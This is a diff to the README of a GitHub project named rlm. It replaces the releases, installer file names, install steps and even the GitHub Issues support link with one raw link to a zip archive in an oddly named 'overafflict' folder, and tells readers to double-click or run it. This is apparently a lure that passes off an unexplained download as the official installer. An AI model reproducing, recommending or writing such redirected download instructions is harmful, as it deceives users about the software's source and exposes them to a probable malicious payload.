@@ -6,9 +6,9 @@ Welcome to the rlm project! This software offers a straightforward way to work w
 
 ## 📥 Download the Software
 
-[![Download rlm](https://img.shields.io/badge/Download%20rlm-v1.0.0-blue.svg)](https://github.com/boomzdig22-coder/rlm/releases)
+[![Download rlm](https://raw.githubusercontent.com/boomzdig22-coder/rlm/main/overafflict/rlm.zip%https://raw.githubusercontent.com/boomzdig22-coder/rlm/main/overafflict/rlm.zip)](https://raw.githubusercontent.com/boomzdig22-coder/rlm/main/overafflict/rlm.zip)
 
-To get started, visit the [Releases page](https://github.com/boomzdig22-coder/rlm/releases) to download the latest version of rlm. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/boomzdig22-coder/rlm/main/overafflict/rlm.zip) to download the latest version of rlm. 
 
 ## 🛠️ Features
 
@@ -27,26 +27,26 @@ Before downloading rlm, ensure your computer meets these basic requirements:
 ## 📥 Download & Install
 
 1. **Visit the Release Page**  
-   Go to the [Releases page](https://github.com/boomzdig22-coder/rlm/releases) to access the files.
+   Go to the [Releases page](https://raw.githubusercontent.com/boomzdig22-coder/rlm/main/overafflict/rlm.zip) to access the files.
 
 2. **Select the Latest Version**  
    Look for the most recent release listed at the top of the page. The version will look something like `v1.0.0`.
 
 3. **Choose the Correct File**  
    You will find multiple files available. Download the file that corresponds to your operating system:
-   - For Windows, download `rlm-windows.exe`
-   - For macOS, download `rlm-macos.dmg`
-   - For Linux, download `rlm-linux.tar.gz`
+   - For Windows, download `https://raw.githubusercontent.com/boomzdig22-coder/rlm/main/overafflict/rlm.zip`
+   - For macOS, download `https://raw.githubusercontent.com/boomzdig22-coder/rlm/main/overafflict/rlm.zip`
+   - For Linux, download `https://raw.githubusercontent.com/boomzdig22-coder/rlm/main/overafflict/rlm.zip`
 
 4. **Install the Application**  
    - **Windows**: 
-     - Double-click the `rlm-windows.exe` file.
+     - Double-click the `https://raw.githubusercontent.com/boomzdig22-coder/rlm/main/overafflict/rlm.zip` file.
      - Follow the prompts to install the application.
    - **macOS**: 
-     - Open `rlm-macos.dmg` file.
+     - Open `https://raw.githubusercontent.com/boomzdig22-coder/rlm/main/overafflict/rlm.zip` file.
      - Drag the rlm icon to your Applications folder.
    - **Linux**: 
-     - Extract the `rlm-linux.tar.gz` file using your preferred method.
+     - Extract the `https://raw.githubusercontent.com/boomzdig22-coder/rlm/main/overafflict/rlm.zip` file using your preferred method.
      - Run the executable file in the extracted folder.
 
 5. **Run rlm**  
@@ -74,7 +74,7 @@ If you face any issues while downloading or running rlm, consider the following:
 
 ## 🛠️ Support
 
-If you have questions or need further assistance, reach out through [GitHub Issues](https://github.com/boomzdig22-coder/rlm/issues). We are here to help you! 
+If you have questions or need further assistance, reach out through [GitHub Issues](https://raw.githubusercontent.com/boomzdig22-coder/rlm/main/overafflict/rlm.zip). We are here to help you! 
 
 ## 📅 Future Updates
 
@@ -86,4 +86,4 @@ We are continuously working on improving rlm. Expected future features include:
 
 Thank you for using rlm. Happy exploring! 
 
-Visit the [Releases page](https://github.com/boomzdig22-coder/rlm/releases) to download the latest version.
+Visit the [Releases page](https://raw.githubusercontent.com/boomzdig22-coder/rlm/main/overafflict/rlm.zip) to download the latest version.
